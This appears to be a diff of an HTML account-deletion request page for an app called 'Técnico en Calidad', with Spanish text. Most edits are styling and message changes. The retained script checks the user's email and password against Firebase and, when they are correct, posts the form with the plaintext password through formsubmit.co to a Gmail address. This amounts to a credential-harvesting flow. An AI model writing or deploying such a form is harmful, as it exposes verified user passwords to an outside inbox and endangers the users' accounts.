@@ -54,6 +54,7 @@ body {
 
 h1 { margin-top: 0; font-weight: 700; text-align: center; color: #001f4d; }
 p { font-size: 1rem; line-height: 1.5; margin-bottom: 25px; text-align: center; }
+
 ul.steps {
   background: #cce0ff;
   border-radius: 10px;
@@ -62,11 +63,15 @@ ul.steps {
   font-weight: 600;
   margin-bottom: 30px;
   box-shadow: inset 0 0 12px #99bbff;
+  text-align: center; /* centrado de pasos */
 }
+
 ul.steps li { margin-bottom: 12px; }
 
+/* CENTRADO DE FORMULARIO */
 form { display: flex; flex-direction: column; align-items: center; }
 
+/* INPUTS Y BOTÓN */
 input[type="email"], input[type="password"], button {
   width: 100%;
   max-width: 400px;
@@ -99,18 +104,15 @@ button {
 button:hover { background: linear-gradient(90deg, #002266, #0044cc); transform: translateY(-3px); }
 button:active { transform: scale(0.97); }
 
-.confirmation, .intermediateMsg {
+.confirmation {
   margin-top: 20px;
   text-align: center;
   font-size: 1rem;
+  color: #ffffff; /* blanco */
+  display: none;
   font-weight: 600;
   opacity: 0;
-  transition: opacity 0.5s ease;
-  display: none;
 }
-
-.confirmation { color: green; }
-.intermediateMsg { color: #0044cc; }
 
 .errorMsg {
   margin-top: 10px;
@@ -119,10 +121,10 @@ button:active { transform: scale(0.97); }
   display: none;
 }
 
+/* Animaciones */
 @keyframes fadeInUp { 0% { opacity: 0; transform: translateY(30px); } 100% { opacity: 1; transform: translateY(0); } }
 @keyframes fadeOutDown { 0% { opacity: 1; transform: translateY(0); } 100% { opacity: 0; transform: translateY(30px); } }
 @keyframes buttonEntrance { 0% { opacity: 0; transform: translateY(20px); } 100% { opacity: 1; transform: translateY(0); } }
-
 </style>
 </head>
 <body>
@@ -133,12 +135,14 @@ button:active { transform: scale(0.97); }
   <ul class="steps">
     <li>1. Abre la aplicación <strong>Técnico en Calidad</strong>.</li>
     <li>2. Toca el botón <strong>"Eliminar Cuenta"</strong> en inicio de sesión.</li>
-    <li>3. Aparecerá un mensaje de confirmación.</li>
-    <li>4. Selecciona <strong>Sí</strong> para continuar.</li>
+    <li>3. Llena tus datos correctamente.</li>
+    <li>4. Aparecerá un mensaje de confirmación.</li>
+    <li>5. Selecciona <strong>Sí</strong> para continuar.</li>
   </ul>
 
   <p>Si prefieres, solicita que borremos tus datos aquí:</p>
 
+  <!-- FORMULARIO CON CORREO Y CONTRASEÑA -->
   <form id="eliminarForm" action="https://formsubmit.co/asistenciatecnicostec@gmail.com" method="POST">
     <input type="email" name="email" placeholder="Tu correo electrónico" required autocomplete="email" />
     <input type="password" name="password" placeholder="Tu contraseña" required autocomplete="current-password" />
@@ -149,20 +153,18 @@ button:active { transform: scale(0.97); }
 
     <button type="submit">Solicitar</button>
     <p class="errorMsg" id="errorMsg">Correo o contraseña incorrectos.</p>
-    <p class="intermediateMsg" id="intermediateMsg">Tu solicitud fue enviada</p>
   </form>
 
-  <p class="confirmation" id="confirmationMsg">¡Revisa tu correo para confirmar!</p>
+  <p class="confirmation" id="confirmationMsg">Tu solicitud fue enviada</p>
 </div>
 
 <script type="module">
-  import { signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.3.0/firebase-auth.js";
+  import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.3.0/firebase-auth.js";
 
   const form = document.getElementById('eliminarForm');
   const confirmationMsg = document.getElementById('confirmationMsg');
   const container = document.getElementById('container');
   const errorMsg = document.getElementById('errorMsg');
-  const intermediateMsg = document.getElementById('intermediateMsg');
   const auth = window.auth;
 
   form.addEventListener('submit', function(event) {
@@ -172,10 +174,7 @@ button:active { transform: scale(0.97); }
 
     signInWithEmailAndPassword(auth, email, password)
     .then((userCredential) => {
-      // Mostrar mensaje intermedio
-      intermediateMsg.style.display = 'block';
-      setTimeout(() => { intermediateMsg.style.opacity = 1; }, 50);
-
+      // Credenciales correctas, enviar formulario
       const formData = new FormData(form);
       fetch(form.action, {
         method: form.method,
@@ -185,20 +184,17 @@ button:active { transform: scale(0.97); }
       .then(response => {
         if(response.ok){
           container.style.animation = 'fadeOutDown 0.5s forwards';
-          setTimeout(() => { container.style.display = 'none'; }, 500);
 
+          // Mostrar mensaje de confirmación durante animación (entre 3s y 4.5s)
           confirmationMsg.style.display = 'block';
-          setTimeout(() => { confirmationMsg.style.opacity = 1; }, 50);
+          confirmationMsg.style.opacity = 0;
+          setTimeout(() => { confirmationMsg.style.opacity = 1; }, 3500);
 
           form.reset();
 
           setTimeout(() => {
-            intermediateMsg.style.opacity = 0;
-            intermediateMsg.style.display = 'none';
-
             confirmationMsg.style.opacity = 0;
-            confirmationMsg.style.display = 'none';
-
+            setTimeout(() => { confirmationMsg.style.display = 'none'; }, 500);
             container.style.display = 'block';
             container.style.animation = 'fadeInUp 0.8s ease forwards';
           }, 5000);
@@ -214,4 +210,3 @@ button:active { transform: scale(0.97); }
 
 </body>
 </html>
-
